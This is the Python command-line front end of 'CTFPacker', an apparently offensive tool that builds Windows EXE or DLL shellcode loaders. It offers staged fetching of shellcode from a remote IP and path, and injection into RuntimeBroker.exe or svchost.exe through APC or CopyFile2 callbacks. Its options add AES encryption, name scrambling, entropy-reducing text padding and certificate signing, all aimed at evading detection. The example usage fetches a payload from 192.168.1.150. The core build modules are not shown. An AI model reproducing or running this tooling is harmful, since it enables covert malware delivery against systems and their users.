# -*- coding: utf-8 -*-
'''

Author:         mocha
X (Twitter):    @mochabyte0x

'''
import sys

from argparse import ArgumentParser
from core.utils import Colors, banner
from core.build_config import BuildConfig
from core.build_engine import BuildEngine


def cli_log(message: str, level: str):
    """Print build messages with CLI color coding."""
    if level == "success":
        print(Colors.green(f"[+] {message}"))
    elif level == "warning":
        print(Colors.light_yellow(f"[+] {message}"))
    elif level == "error":
        print(Colors.red(f"[!] {message}"))
    else:
        print(Colors.green(f"[i] {message}"))


def main():
    parser = ArgumentParser(description="CTFPacker", epilog="Author: @mochabyte")
    subparsers = parser.add_subparsers(dest="commands", help="Staged or Stageless Payloads", required=True)

    # Staged subcommand
    parser_staged = subparsers.add_parser("staged", help="Staged")
    parser_staged.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
    parser_staged.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
    parser_staged.add_argument("-apc", "--apc", help="Choose between RuntimeBroker.exe or svchost.exe as a target injection process. Defaults to RuntimeBroker.exe", choices=["RuntimeBroker.exe", "svchost.exe"], default="RuntimeBroker.exe")
    parser_staged.add_argument("-inj", "--inject-method", type=str, choices=["apc", "copyfile2"], default="apc", help="Choose injection method: 'apc' for APC injection or 'copyfile2' for CopyFile2 progress callback execution (default: apc).")
    parser_staged.add_argument("-i", "--ip-address", type=str, help="IP address from where your shellcode is gonna be fetched.", required=True)
    parser_staged.add_argument("-po", "--port", type=int, help="Port from where the HTTP connection is gonna fetch your shellcode.", required=True)
    parser_staged.add_argument("-pa", "--path", type=str, help="Path from where your shellcode is gonna be fetched.", required=True)
    parser_staged.add_argument("-o", "--output", type=str, help="Output path where the shellcode is gonna be saved.")
    parser_staged.add_argument("--https", action="store_true", help="Use HTTPS instead of HTTP for downloading shellcode.")
    parser_staged.add_argument("--user-agent", type=str, default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", help="Custom User-Agent string for HTTP/HTTPS requests.")
    parser_staged.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the shellcode via AES-128-CBC.")
    parser_staged.add_argument("-s", "--scramble", action="store_true", help="Scramble the loader's functions and variables.")
    parser_staged.add_argument("-er", "--entropy-reduction", action="store_true", help="Reduce binary entropy by embedding English text padding.")
    parser_staged.add_argument("-pfx", "--pfx", type=str, help="Path to the PFX file for signing the loader.")
    parser_staged.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for the PFX file.")
    parser_staged.epilog = "Example usage: python main.py staged -p shellcode.bin -i 192.168.1.150 -po 8080 -pa '/shellcode.bin' -o shellcode -e -s --https --user-agent 'CustomAgent/1.0' -pfx cert.pfx -pfx-pass 'password'"

    # Stageless subcommand
    parser_stageless = subparsers.add_parser("stageless", help="Stageless")
    parser_stageless.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
    parser_stageless.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
    parser_stageless.add_argument("-apc", "--apc", help="Choose between RuntimeBroker.exe or svchost.exe as a target injection process. Defaults to RuntimeBroker.exe", choices=["RuntimeBroker.exe", "svchost.exe"], default="RuntimeBroker.exe")
    parser_stageless.add_argument("-inj", "--inject-method", type=str, choices=["apc", "copyfile2"], default="apc", help="Choose injection method: 'apc' for APC injection or 'copyfile2' for CopyFile2 progress callback execution (default: apc).")
    parser_stageless.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the shellcode via AES-128-CBC.")
    parser_stageless.add_argument("-s", "--scramble", action="store_true", help="Scramble the loader's functions and variables.")
    parser_stageless.add_argument("-er", "--entropy-reduction", action="store_true", help="Reduce binary entropy by embedding English text padding.")
    parser_stageless.add_argument("-pfx", "--pfx", type=str, help="Path to the PFX file for signing the loader.")
    parser_stageless.add_argument("-pfx-pass", "--pfx-password", type=str, help="Password for the PFX file.")
    parser_stageless.epilog = "Example usage: python main.py stageless -p shellcode.bin -e -s -pfx cert.pfx -pfx-pass 'password'"

    args = parser.parse_args()
    banner()

    # Build config from parsed args
    config = BuildConfig(
        mode=args.commands,
        payload_path=args.payload,
        format=args.format or "EXE",
        inject_method=args.inject_method,
        target_process=args.apc,
        encrypt=args.encrypt,
        scramble=args.scramble,
        entropy_reduction=args.entropy_reduction,
        pfx=args.pfx,
        pfx_password=args.pfx_password,
        output=getattr(args, 'output', None) or "ctfloader",
        ip_address=getattr(args, 'ip_address', "") or "",
        port=getattr(args, 'port', 8080) or 8080,
        path=getattr(args, 'path', "") or "",
        https=getattr(args, 'https', False),
        user_agent=getattr(args, 'user_agent', BuildConfig.user_agent),
    )

    engine = BuildEngine(cli_log)
    success = engine.build(config)
    if not success:
        sys.exit(1)


if __name__ == "__main__":
    main()
